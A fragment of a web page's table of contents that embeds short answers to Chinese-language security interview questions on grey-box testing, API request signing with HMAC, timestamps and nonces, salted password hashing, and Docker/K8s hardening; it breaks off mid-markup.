class="toc-text">黑盒扫描时如何避免被反制？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%95%BF%E6%9C%9F%E7%AD%96%E7%95%A5%EF%BC%9A-%E9%87%87%E7%94%A8-%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B5%84%E4%BA%A7%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%EF%BC%88%E5%A6%82-Burp-Suite-Headless-Chrome%EF%BC%89%EF%BC%8C%E7%BB%95%E8%BF%87%E7%AE%80%E5%8D%95%E7%9A%84-WAF-%E9%98%B2%E6%8A%A4%E3%80%82"><span class="toc-number">36.</span> <span class="toc-text">长期策略：- 采用 企业级资产扫描工具（如 Burp Suite + Headless Chrome），绕过简单的 WAF 防护。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%81%B0%E7%9B%92%E7%9B%B8%E8%BE%83%E4%BA%8E%E9%BB%91%E7%99%BD%E7%9B%92%E7%9A%84%E4%BC%98%E5%8A%BF%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">36.0.1.</span> <span class="toc-text">灰盒相较于黑白盒的优势是什么？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%81%B0%E7%9B%92%E6%B5%8B%E8%AF%95%E7%9A%84%E4%BC%98%E5%8A%BF%EF%BC%9A-%E7%BB%93%E5%90%88%E9%BB%91%E7%9B%92%E4%B8%8E%E7%99%BD%E7%9B%92%E6%B5%8B%E8%AF%95%EF%BC%9A-%E6%97%A2%E8%83%BD%E5%88%A9%E7%94%A8%E5%86%85%E9%83%A8%E4%BF%A1%E6%81%AF%EF%BC%88%E5%A6%82-API-%E6%96%87%E6%A1%A3%E3%80%81%E9%83%A8%E5%88%86%E4%BB%A3%E7%A0%81%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%EF%BC%89%E6%8F%90%E9%AB%98%E6%B5%8B%E8%AF%95%E6%95%88%E7%8E%87%EF%BC%8C%E5%8F%88%E8%83%BD%E6%A8%A1%E6%8B%9F%E7%9C%9F%E5%AE%9E%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF%E8%BF%9B%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%82-%E6%8F%90%E9%AB%98%E6%B5%8B%E8%AF%95%E8%A6%86%E7%9B%96%E7%8E%87%EF%BC%9A-%E9%80%9A%E8%BF%87%E9%83%A8%E5%88%86%E6%BA%90%E4%BB%A3%E7%A0%81%E5%92%8C%E6%8E%A5%E5%8F%A3%E6%9D%83%E9%99%90%EF%BC%8C%E6%B5%8B%E8%AF%95%E4%BA%BA%E5%91%98%E5%8F%AF%E4%BB%A5%E6%9B%B4%E7%B2%BE%E7%A1%AE%E5%9C%B0%E5%88%86%E6%9E%90%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%EF%BC%8C%E5%A6%82%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E3%80%81%E4%B8%9A%E5%8A%A1%E6%BB%A5%E7%94%A8%E3%80%82-%E5%87%8F%E5%B0%91%E8%AF%AF%E6%8A%A5%EF%BC%9A-%E7%94%B1%E4%BA%8E%E5%8F%AF%E8%AE%BF%E9%97%AE%E9%83%A8%E5%88%86%E5%86%85%E9%83%A8%E9%80%BB%E8%BE%91%EF%BC%8C%E5%87%8F%E5%B0%91%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E8%AF%AF%E6%8A%A5%EF%BC%8C%E6%8F%90%E9%AB%98%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E7%9A%84%E5%87%86%E7%A1%AE%E6%80%A7%E3%80%82"><span class="toc-number">37.</span> <span class="toc-text">灰盒测试的优势：- 结合黑盒与白盒测试：  - 既能利用内部信息（如 API 文档、部分代码访问权限）提高测试效率，又能模拟真实攻击场景进行漏洞挖掘。- 提高测试覆盖率：  - 通过部分源代码和接口权限，测试人员可以更精确地分析逻辑漏洞，如权限绕过、业务滥用。- 减少误报：  - 由于可访问部分内部逻辑，减少黑盒测试中的误报，提高漏洞发现的准确性。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%BD%E8%B1%A1%E6%9D%A5%E7%9C%8B%EF%BC%8C%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0%E5%88%B0%E5%BA%95%E8%A6%81%E8%AF%84%E4%BB%80%E4%B9%88%E4%B8%9C%E8%A5%BF%EF%BC%9F"><span class="toc-number">37.0.1.</span> <span class="toc-text">抽象来看，安全评估到底要评什么东西？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0%E6%A0%B8%E5%BF%83%EF%BC%9A1-%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90%EF%BC%9A-%E8%AF%86%E5%88%AB%E5%8F%AF%E8%83%BD%E7%9A%84%E6%94%BB%E5%87%BB%E5%85%A5%E5%8F%A3%EF%BC%8C%E5%8C%85%E6%8B%AC-API%E3%80%81Web-%E7%95%8C%E9%9D%A2%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93%E3%80%81%E7%AC%AC%E4%B8%89%E6%96%B9%E9%9B%86%E6%88%90%E7%AD%89%E3%80%822-%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%EF%BC%9A-%E8%AF%84%E4%BC%B0%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E3%80%81%E4%BC%A0%E8%BE%93%E5%8F%8A%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%EF%BC%8C%E9%98%B2%E6%AD%A2%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E5%92%8C%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E3%80%823-%E8%BA%AB%E4%BB%BD%E4%B8%8E%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86%EF%BC%9A-%E6%A3%80%E6%9F%A5%E8%AE%A4%E8%AF%81%E6%96%B9%E5%BC%8F%EF%BC%88JWT%E3%80%81OAuth%EF%BC%89%E3%80%81%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6%E6%9C%BA%E5%88%B6%EF%BC%88RBAC%E3%80%81ABAC%EF%BC%89%E3%80%824-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E4%B8%8E%E6%B5%8B%E8%AF%95%EF%BC%9A-%E8%BF%9B%E8%A1%8C%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88SAST%EF%BC%89%E3%80%81%E5%8A%A8%E6%80%81%E6%B5%8B%E8%AF%95%EF%BC%88DAST%EF%BC%89%E3%80%81%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%EF%BC%88Fuzzing%EF%BC%89%E3%80%825-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E9%A3%8E%E9%99%A9%EF%BC%9A-%E8%AF%86%E5%88%AB%E5%A6%82%E6%94%AF%E4%BB%98%E7%BB%95%E8%BF%87%E3%80%81%E7%A7%AF%E5%88%86%E6%BB%A5%E7%94%A8%E3%80%81%E8%AE%A2%E5%8D%95%E5%8A%AB%E6%8C%81%E7%AD%89%E4%B8%9A%E5%8A%A1%E6%BC%8F%E6%B4%9E%E3%80%82"><span class="toc-number">38.</span> <span class="toc-text">安全评估核心：1. 攻击面分析：   - 识别可能的攻击入口，包括 API、Web 界面、数据库、第三方集成等。2. 数据安全：   - 评估数据存储、传输及访问控制的安全性，防止数据泄露和未授权访问。3. 身份与权限管理：   - 检查认证方式（JWT、OAuth）、权限控制机制（RBAC、ABAC）。4. 漏洞扫描与测试：   - 进行静态代码分析（SAST）、动态测试（DAST）、模糊测试（Fuzzing）。5. 业务逻辑风险：   - 识别如支付绕过、积分滥用、订单劫持等业务漏洞。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E4%B8%AA%E5%BA%94%E7%94%A8%E5%BC%80%E6%94%BE%E5%87%BA%E5%8E%BB-API%EF%BC%8C%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E5%93%AA%E4%BA%9B%E9%A3%8E%E9%99%A9%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E5%BA%94%E5%AF%B9%EF%BC%9F"><span class="toc-number">38.0.1.</span> <span class="toc-text">一个应用开放出去 API，可能存在哪些风险以及如何应对？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E5%AF%B9%E6%8E%AA%E6%96%BD%EF%BC%9A-%E5%8A%A0%E5%AF%86%E4%BC%A0%E8%BE%93%EF%BC%9A%E5%BC%BA%E5%88%B6%E4%BD%BF%E7%94%A8-HTTPS%EF%BC%8C%E5%B9%B6%E5%90%AF%E7%94%A8-HSTS-%E4%BF%9D%E6%8A%A4%E3%80%82-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%EF%BC%9A%E4%BD%BF%E7%94%A8-OAuth2-0%E3%80%81JWT-%E6%88%96-API-Key-%E7%BB%93%E5%90%88-HMAC-%E7%AD%BE%E5%90%8D%E3%80%82-%E8%AF%B7%E6%B1%82%E9%98%B2%E6%8A%A4%EF%BC%9A-%E4%BD%BF%E7%94%A8-%E8%AF%B7%E6%B1%82%E7%AD%BE%E5%90%8D%E6%9C%BA%E5%88%B6%EF%BC%8C%E9%98%B2%E6%AD%A2%E7%AF%A1%E6%94%B9%E5%92%8C%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB%E3%80%82-%E6%B7%BB%E5%8A%A0-%E6%97%B6%E9%97%B4%E6%88%B3-%E9%9A%8F%E6%9C%BA%E6%95%B0%EF%BC%8C%E7%A1%AE%E4%BF%9D%E8%AF%B7%E6%B1%82%E5%94%AF%E4%B8%80%E6%80%A7%E3%80%82"><span class="toc-number">39.</span> <span class="toc-text">应对措施：- 加密传输：强制使用 HTTPS，并启用 HSTS 保护。- 身份认证：使用 OAuth2.0、JWT 或 API Key 结合 HMAC 签名。- 请求防护：  - 使用 请求签名机制，防止篡改和重放攻击。  - 添加 时间戳 + 随机数，确保请求唯一性。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BE%E8%AE%A1-API-%E7%AD%BE%E5%90%8D%E6%97%B6%EF%BC%8C%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%BD%BF%E7%94%A8%E7%A7%92%E6%97%B6%E9%97%B4%E6%88%B3%EF%BC%88timestamp-s%EF%BC%89%E4%BC%9A%E5%AD%98%E5%9C%A8%E5%93%AA%E4%BA%9B%E9%A3%8E%E9%99%A9%EF%BC%9F"><span class="toc-number">39.0.1.</span> <span class="toc-text">设计 API 签名时，随机数使用秒时间戳（timestamp&#x2F;s）会存在哪些风险？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E5%AF%B9%E6%96%B9%E6%A1%88%EF%BC%9A-%E4%BD%BF%E7%94%A8%E6%AF%AB%E7%A7%92%E7%BA%A7%E6%97%B6%E9%97%B4%E6%88%B3%EF%BC%88timestamp-ms%EF%BC%89%E9%99%8D%E4%BD%8E%E9%87%8D%E6%94%BE%E7%AA%97%E5%8F%A3%E3%80%82-%E5%BC%95%E5%85%A5%E9%9A%8F%E6%9C%BA%E6%95%B0%EF%BC%88nonce%EF%BC%89%EF%BC%8C%E7%A1%AE%E4%BF%9D%E6%AF%8F%E6%AC%A1%E8%AF%B7%E6%B1%82%E7%9A%84%E5%94%AF%E4%B8%80%E6%80%A7%EF%BC%9A"><span class="toc-number">40.</span> <span class="toc-text">应对方案：- 使用毫秒级时间戳（timestamp&#x2F;ms）降低重放窗口。- 引入随机数（nonce），确保每次请求的唯一性：  123timestamp &#x3D; str(int(time.time() * 1000))nonce &#x3D; uuid.uuid4().hexsignature &#x3D; hmac_sha256(secret_key, timestamp + nonce + payload)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BE%E8%AE%A1-API-%E7%AD%BE%E5%90%8D%E6%97%B6%EF%BC%8CHMAC-SHA256-%E5%92%8C-SHA256-%E5%8C%BA%E5%88%AB%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">40.0.1.</span> <span class="toc-text">设计 API 签名时，HMAC SHA256 和 SHA256 区别是什么？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HMAC-SHA256%EF%BC%9A-%E5%9F%BA%E4%BA%8E-SHA256-%E7%9A%84%E5%8A%A0%E5%AF%86%E5%93%88%E5%B8%8C%E6%B6%88%E6%81%AF%E8%AE%A4%E8%AF%81%E7%A0%81%EF%BC%88Hash-based-Message-Authentication-Code%EF%BC%89%E3%80%82-%E4%BD%BF%E7%94%A8%E5%AF%86%E9%92%A5%E8%BF%9B%E8%A1%8C%E5%93%88%E5%B8%8C%E8%AE%A1%E7%AE%97%EF%BC%9A-%E5%AE%89%E5%85%A8%E6%80%A7%E6%9B%B4%E9%AB%98%EF%BC%9AHMAC-%E9%80%9A%E8%BF%87%E5%AF%86%E9%92%A5%E5%A2%9E%E5%BC%BA%E5%AE%89%E5%85%A8%E6%80%A7%EF%BC%8C%E9%81%BF%E5%85%8D-SHA256-%E5%8F%AF%E8%83%BD%E8%A2%AB%E4%BC%AA%E9%80%A0%E3%80%82"><span class="toc-number">41.</span> <span class="toc-text">HMAC SHA256：- 基于 SHA256 的加密哈希消息认证码（Hash-based Message Authentication Code）。- 使用密钥进行哈希计算：  12345import hmacimport hashlibmessage &#x3D; &quot;data-to-sign&quot;secret_key &#x3D; &quot;my-secret-key&quot;signature &#x3D; hmac.new(secret_key.encode(), message.encode(), hashlib.sha256).hexdigest()- 安全性更高：HMAC 通过密钥增强安全性，避免 SHA256 可能被伪造。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%A6%82%E4%BD%95%E5%8A%A0%E5%AF%86%E4%BF%9D%E5%AD%98%EF%BC%9F"><span class="toc-number">41.0.1.</span> <span class="toc-text">密码如何加密保存？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%AD%98%E5%82%A8%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5%EF%BC%9A1-%E4%BD%BF%E7%94%A8%E5%BC%BA%E5%93%88%E5%B8%8C%E7%AE%97%E6%B3%95%EF%BC%9A-%E6%8E%A8%E8%8D%90%E4%BD%BF%E7%94%A8-PBKDF2%E3%80%81bcrypt-%E6%88%96-scrypt%EF%BC%8C%E9%81%BF%E5%85%8D%E4%BD%BF%E7%94%A8-MD5%E3%80%81SHA1%E3%80%81SHA256-%E7%9B%B4%E6%8E%A5%E5%AD%98%E5%82%A8%E3%80%822-%E6%B7%BB%E5%8A%A0%E9%9A%8F%E6%9C%BA%E7%9B%90%EF%BC%88Salt%EF%BC%89%EF%BC%9A-%E8%A7%A3%E5%86%B3-%E5%BD%A9%E8%99%B9%E8%A1%A8%E6%94%BB%E5%87%BB%EF%BC%8C%E7%A1%AE%E4%BF%9D%E7%9B%B8%E5%90%8C%E5%AF%86%E7%A0%81%E5%93%88%E5%B8%8C%E5%80%BC%E4%B8%8D%E5%90%8C%E3%80%823-%E4%BD%BF%E7%94%A8%E5%AF%86%E9%92%A5%E6%8E%A8%E5%AF%BC%E5%87%BD%E6%95%B0%EF%BC%9A-PBKDF2%EF%BC%88%E5%9F%BA%E4%BA%8E-HMAC-%E7%9A%84%E5%AF%86%E9%92%A5%E6%B4%BE%E7%94%9F%EF%BC%89%EF%BC%9A-bcrypt%EF%BC%88%E9%80%82%E7%94%A8%E4%BA%8E-Web-%E5%BA%94%E7%94%A8%EF%BC%89%EF%BC%9A-scrypt%EF%BC%88%E9%80%82%E7%94%A8%E4%BA%8E%E9%AB%98%E5%AE%89%E5%85%A8%E5%9C%BA%E6%99%AF%EF%BC%89%EF%BC%9A-4-%E9%81%BF%E5%85%8D%E6%98%8E%E6%96%87%E5%AD%98%E5%82%A8%EF%BC%9A-%E4%B8%A5%E7%A6%81%E5%AD%98%E5%82%A8%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%EF%BC%8C%E6%89%80%E6%9C%89%E5%AF%86%E7%A0%81%E5%BF%85%E9%A1%BB%E7%BB%8F%E8%BF%87%E5%AE%89%E5%85%A8%E5%93%88%E5%B8%8C%E5%A4%84%E7%90%86%E3%80%82"><span class="toc-number">42.</span> <span class="toc-text">密码存储最佳实践：1. 使用强哈希算法：   - 推荐使用 PBKDF2、bcrypt 或 scrypt，避免使用 MD5、SHA1、SHA256 直接存储。2. 添加随机盐（Salt）：   - 解决 彩虹表攻击，确保相同密码哈希值不同。3. 使用密钥推导函数：   - PBKDF2（基于 HMAC 的密钥派生）：     123import hashlib, ossalt &#x3D; os.urandom(16)password_hash &#x3D; hashlib.pbkdf2_hmac(&#39;sha256&#39;, password.encode(), salt, 100000)   - bcrypt（适用于 Web 应用）：     12from bcrypt import gensalt, hashpwhashed &#x3D; hashpw(password.encode(), gensalt())   - scrypt（适用于高安全场景）：     12import hashlibhashed &#x3D; hashlib.scrypt(password.encode(), salt&#x3D;os.urandom(16), n&#x3D;16384, r&#x3D;8, p&#x3D;1)4. 避免明文存储：   - 严禁存储明文密码，所有密码必须经过安全哈希处理。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%90%E4%BA%9B%E5%9C%BA%E6%99%AF%EF%BC%88%E7%99%BB%E5%BD%95%E3%80%81%E6%B3%A8%E5%86%8C%E3%80%81%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81%E3%80%81%E6%94%AF%E4%BB%98%EF%BC%89%E4%BC%9A%E5%AD%98%E5%9C%A8%E5%93%AA%E4%BA%9B%E9%A3%8E%E9%99%A9%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E9%98%B2%E8%8C%83%EF%BC%9F"><span class="toc-number">42.0.1.</span> <span class="toc-text">某些场景（登录、注册、修改密码、支付）会存在哪些风险以及如何防范？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD%EF%BC%9A-%E7%99%BB%E5%BD%95%EF%BC%9A%E4%BD%BF%E7%94%A8%E9%AA%8C%E8%AF%81%E7%A0%81%E3%80%81IP-%E9%A2%91%E7%8E%87%E9%99%90%E5%88%B6%E3%80%81%E4%BA%8C%E6%AC%A1%E9%AA%8C%E8%AF%81%EF%BC%882FA%EF%BC%89%E3%80%82-%E6%B3%A8%E5%86%8C%EF%BC%9A%E9%99%90%E5%88%B6%E6%89%B9%E9%87%8F%E6%B3%A8%E5%86%8C%EF%BC%88%E5%A6%82%E5%9F%BA%E4%BA%8E%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90%E6%A3%80%E6%B5%8B%EF%BC%89%E3%80%82-%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81%EF%BC%9A%E8%A6%81%E6%B1%82%E8%BE%93%E5%85%A5%E6%97%A7%E5%AF%86%E7%A0%81%EF%BC%8C%E6%88%96%E8%BF%9B%E8%A1%8C%E4%BA%8C%E6%AC%A1%E9%AA%8C%E8%AF%81%EF%BC%88%E7%9F%AD%E4%BF%A1-%E9%82%AE%E4%BB%B6%EF%BC%89%E3%80%82-%E6%94%AF%E4%BB%98%EF%BC%9A%E4%BD%BF%E7%94%A8-HMAC-%E7%AD%BE%E5%90%8D%EF%BC%8C%E9%98%B2%E6%AD%A2%E8%AF%B7%E6%B1%82%E7%AF%A1%E6%94%B9%EF%BC%8C%E5%90%AF%E7%94%A8-%E5%B9%82%E7%AD%89%E6%9C%BA%E5%88%B6-%E9%81%BF%E5%85%8D%E9%87%8D%E5%A4%8D%E6%94%AF%E4%BB%98%E3%80%82"><span class="toc-number">43.</span> <span class="toc-text">防范措施：- 登录：使用验证码、IP 频率限制、二次验证（2FA）。- 注册：限制批量注册（如基于行为分析检测）。- 修改密码：要求输入旧密码，或进行二次验证（短信&#x2F;邮件）。- 支付：使用 HMAC 签名，防止请求篡改，启用 幂等机制 避免重复支付。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B0%E5%BA%94%E7%94%A8%E5%A6%82%E4%BD%95%E8%AF%84%E4%BC%B0%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9%EF%BC%9F"><span class="toc-number">43.0.1.</span> <span class="toc-text">新应用如何评估安全风险？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%84%E4%BC%B0%E6%96%B9%E6%B3%95%EF%BC%9A1-%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90%EF%BC%9A-%E8%AF%86%E5%88%AB-API%E3%80%81%E5%89%8D%E7%AB%AF%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93%E3%80%81%E7%AC%AC%E4%B8%89%E6%96%B9%E9%9B%86%E6%88%90%E7%9A%84%E6%BD%9C%E5%9C%A8%E6%BC%8F%E6%B4%9E%E7%82%B9%E3%80%822-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E4%B8%8E%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%EF%BC%9A-%E7%A1%AE%E4%BF%9D%E4%BD%BF%E7%94%A8-JWT%E3%80%81OAuth-%E8%BF%9B%E8%A1%8C%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%EF%BC%8C%E9%81%BF%E5%85%8D%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E3%80%823-%E6%95%B0%E6%8D%AE%E4%BF%9D%E6%8A%A4%EF%BC%9A-%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E5%AD%98%E5%82%A8%EF%BC%8C%E9%98%B2%E6%AD%A2%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E3%80%824-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%EF%BC%9A-%E8%AF%84%E4%BC%B0%E6%94%AF%E4%BB%98%E3%80%81%E4%BA%A4%E6%98%93%E7%AD%89%E5%85%B3%E9%94%AE%E5%8A%9F%E8%83%BD%EF%BC%8C%E9%98%B2%E6%AD%A2%E6%81%B6%E6%84%8F%E5%88%A9%E7%94%A8%E3%80%82"><span class="toc-number">44.</span> <span class="toc-text">评估方法：1. 攻击面分析：   - 识别 API、前端、数据库、第三方集成的潜在漏洞点。2. 身份认证与访问控制：   - 确保使用 JWT、OAuth 进行身份认证，避免越权访问。3. 数据保护：   - 敏感数据加密存储，防止数据泄露。4. 业务逻辑漏洞：   - 评估支付、交易等关键功能，防止恶意利用。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9C%80%E6%B1%82%E9%98%B6%E6%AE%B5%E3%80%81%E5%90%84%E5%88%86%E9%98%B6%E6%AE%B5%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0%E7%9A%84%E4%BE%A7%E9%87%8D%E7%82%B9%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">44.0.1.</span> <span class="toc-text">需求阶段、各分阶段安全评估的侧重点是什么？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%A5%E5%8F%A3-B-%E7%9A%84%E5%8F%82%E6%95%B0%E6%98%AF%E4%BB%8E%E6%8E%A5%E5%8F%A3-A-%E7%9A%84%E5%93%8D%E5%BA%94%E4%B8%AD%E8%8E%B7%E5%8F%96%E7%9A%84%EF%BC%8C%E4%BC%9A%E5%AD%98%E5%9C%A8%E5%93%AA%E4%BA%9B%E9%A3%8E%E9%99%A9%EF%BC%9F"><span class="toc-number">44.0.2.</span> <span class="toc-text">接口 B 的参数是从接口 A 的响应中获取的，会存在哪些风险？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD%EF%BC%9A-%E6%95%B0%E6%8D%AE%E5%AE%8C%E6%95%B4%E6%80%A7%E6%A0%A1%E9%AA%8C%EF%BC%9A%E6%8E%A5%E5%8F%A3-A-%E7%9A%84%E5%93%8D%E5%BA%94%E5%BF%85%E9%A1%BB%E8%BF%9B%E8%A1%8C%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81%E3%80%82-%E9%99%90%E5%88%B6%E6%95%B0%E6%8D%AE%E6%9D%A5%E6%BA%90%EF%BC%9A%E6%8E%A5%E5%8F%A3-B-%E4%BB%85%E6%8E%A5%E5%8F%97%E5%8F%AF%E4%BF%A1-API-%E7%9A%84%E6%95%B0%E6%8D%AE%E3%80%82-%E4%BD%BF%E7%94%A8-Token-%E5%85%B3%E8%81%94%E8%AF%B7%E6%B1%82%EF%BC%8C%E9%98%B2%E6%AD%A2%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9%E3%80%82"><span class="toc-number">45.</span> <span class="toc-text">防范措施：- 数据完整性校验：接口 A 的响应必须进行签名验证。- 限制数据来源：接口 B 仅接受可信 API 的数据。- 使用 Token 关联请求，防止数据篡改。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B0%E7%9A%84-API-%E6%8E%A5%E5%8F%A3%E4%B8%8A%E7%BA%BF%E6%97%B6%EF%BC%8C%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1%E4%BD%BF%E5%85%B6%E9%81%BF%E5%85%8D%E5%87%BA%E7%8E%B0%E8%AF%B7%E6%B1%82%E7%AF%A1%E6%94%B9%E5%92%8C%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE%EF%BC%9F"><span class="toc-number">45.0.1.</span> <span class="toc-text">新的 API 接口上线时，如何设计使其避免出现请求篡改和请求重放？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E9%87%8D%E6%94%BE%E6%8E%AA%E6%96%BD%EF%BC%9A-%E4%BD%BF%E7%94%A8%E6%97%B6%E9%97%B4%E6%88%B3-%E9%9A%8F%E6%9C%BA%E6%95%B0%EF%BC%9A-%E5%9C%A8%E8%AF%B7%E6%B1%82%E4%B8%AD%E6%B7%BB%E5%8A%A0-timestamp-nonce%EF%BC%8C%E7%A1%AE%E4%BF%9D%E5%94%AF%E4%B8%80%E6%80%A7%EF%BC%9A-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E5%AD%98%E5%82%A8%E5%B7%B2%E4%BD%BF%E7%94%A8%E7%9A%84-nonce%EF%BC%8C%E9%98%B2%E6%AD%A2%E9%87%8D%E5%A4%8D%E8%AF%B7%E6%B1%82%E3%80%82"><span class="toc-number">46.</span> <span class="toc-text">防重放措施：- 使用时间戳+随机数：  - 在请求中添加 timestamp + nonce，确保唯一性：    12345{  &quot;timestamp&quot;: 1700000000,  &quot;nonce&quot;: &quot;random-uuid&quot;,  &quot;signature&quot;: &quot;hmac_signature&quot;}  - 服务器端存储已使用的 nonce，防止重复请求。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Docker-%E5%AE%B9%E5%99%A8%E4%BB%A5%E5%8F%8A-K8s-%E6%9C%89%E5%93%AA%E4%BA%9B%E9%A3%8E%E9%99%A9%EF%BC%9F"><span class="toc-number">46.0.1.</span> <span class="toc-text">Docker 容器以及 K8s 有哪些风险？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD%EF%BC%9A-%E4%BD%BF%E7%94%A8-%E6%9C%80%E5%B0%8F%E6%9D%83%E9%99%90%E5%8E%9F%E5%88%99-%E9%99%90%E5%88%B6%E5%AE%B9%E5%99%A8%E5%92%8C-K8s-%E8%B5%84%E6%BA%90%E8%AE%BF%E9%97%AE%E3%80%82-%E5%90%AF%E7%94%A8-Pod-Security-Policy%EF%BC%8C%E9%81%BF%E5%85%8D%E8%BF%90%E8%A1%8C%E9%AB%98%E6%9D%83%E9%99%90%E5%AE%B9%E5%99%A8%E3%80%82-%E5%AE%9A%E6%9C%9F%E6%89%AB%E6%8F%8F%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%EF%BC%8C%E9%98%B2%E6%AD%A2%E4%BE%9B%E5%BA%94%E9%93%BE%E6%94%BB%E5%87%BB%E3%80%82"><span class="toc-number">47.</span> <span class="toc-text">防范措施：- 使用 最小权限原则 限制容器和 K8s 资源访问。- 启用 Pod Security Policy，避免运行高权限容器。- 定期扫描容器镜像，防止供应链攻击。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IPv6-%E5%92%8C-IPv4-%E5%AE%89%E5%85%A8%E5%B7%AE%E5%BC%82%EF%BC%9F"><span class="toc-number">47.0.1.</span> <span class="toc-text">IPv6 和 IPv4 安全差异？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" 